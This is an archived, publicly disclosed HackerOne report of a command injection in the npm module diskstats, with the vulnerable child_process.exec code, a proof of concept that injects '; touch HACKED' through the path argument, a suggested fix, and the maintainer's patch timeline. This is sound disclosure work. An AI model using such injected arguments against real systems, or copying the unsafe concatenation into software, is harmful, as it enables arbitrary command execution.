---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/node
  - vuln/command-injection
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2020-07-23
submitted: 2020-05-01T19:55:01.641Z
bounty_usd: null
votes: 2
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/864354"
title: "[diskstats] Command Injection via insecure command concatenation"
---
# [diskstats] Command Injection via insecure command concatenation

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 2 | **Program:** Node.js third-party modules | **Disclosed:** 2020-07-23

- Report: [https://hackerone.com/reports/864354](https://hackerone.com/reports/864354)
- CWE: Command Injection - Generic
- Submitted: 2020-05-01T19:55:01.641Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `Command Injection` issue in the `diskstats` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `diskstats`
**version:** `0.0.2`
**npm page:** `https://www.npmjs.com/package/diskstats`

## Module Description

This library uses df to pull disk information such as free space & inode utilization on your system. This library only works on systems where df is installed and present within your path.

## Module Stats

[2] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

Here's the code which causes the issue:

```javascript
// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L44
....
stat.prototype._fetchSpace = function(path) {
	return new Promise((resolve, reject) => {
		this.child_process.exec('df ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection
			if (err) {
				return reject(err);
			}			

			return resolve(this._parseResponse(stdout));
		});
	});
};

// https://github.com/PhilipSkinner/diskstats/blob/master/lib/stat.js#L56
stat.prototype._fetchInodes = function(path) {
	return new Promise((resolve, reject) => {
		this.child_process.exec('df -i ' + this._ensureAbsPath(path), (err, stdout) => {  // <-- injection
			if (err) {
				return reject(err);
			}

			return resolve(this._parseResponse(stdout));
		});
	});
};
...
module.exports = function(child_process, path) {
	if (!child_process) {
		child_process = require('child_process');
	}

	if (!path) {
		path = require('path');
	}

	return new stat(child_process, path);
}
```
The `path` parameter is used to build the command that is passed to the `child_process.exec` function without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `diskstats` module:
    -  `npm i diskstats`
- create the following PoC JavaScript file (`poc.js`):

```javascript
const diskstats = require('diskstats');
diskstats.check('; touch HACKED', (err, results) => {});

```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F811513}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `diskstats` module via insecure command concatenation.

## Timeline

- **Report Filed**
- **2020-05-01** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **External User Joined**
- **2020-07-23** @philipskinner: Hello,

Many thanks for the excellent write up.

I have published version 0.1.0 of diskstats which corrects this (latest code here https://github.com/PhilipSkinner/diskstats) plus I have deprecated all versions previous to this with a warning that a critical issue was corrected in version 0.1.0.

I have added a unit test with your example that proves that it now throws an error instead of executing your injected code.

Apologies for the delay, I was only alerted to this issue yesterday.

Many thanks,

Philip.
- **2020-07-23** @bbe8482aecd24374d13c5de15a0a6: @philipskinner thanks for providing a new version with the fix.

@d3lla can you confirm that this fixes the reported issue and are you both ok with the disclosure of the report?
- **2020-07-23** @d3lla: Hi everybody,

@philipskinner Thank you for your prompt reply and for your fix.
Your changes seems to fix the problem. 

I run the previous poc:
```javascript
const diskstats = require('diskstats');
diskstats.check('; touch HACKED', (err, results) => {});

```

and I was not able to reproduce the previous reported result.



@danielruf From my side it's fine to disclose the report.

Thank you for your time and have a nice day,
d3lla

I tested using the following configurations:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4
- **Report Resolved**
- **Agreed On Going Public**
- **2020-07-23** @bbe8482aecd24374d13c5de15a0a6: Small additional feedback that I forgot because I was distracted.

> I have added a unit test with your example that proves that it now throws an error instead of executing your injected code.

That is really awesome and I really like that, we rarely see that projects have (regression) tests for vulnerabilities =)
- **Agreed On Going Public**
- **Report Became Public**
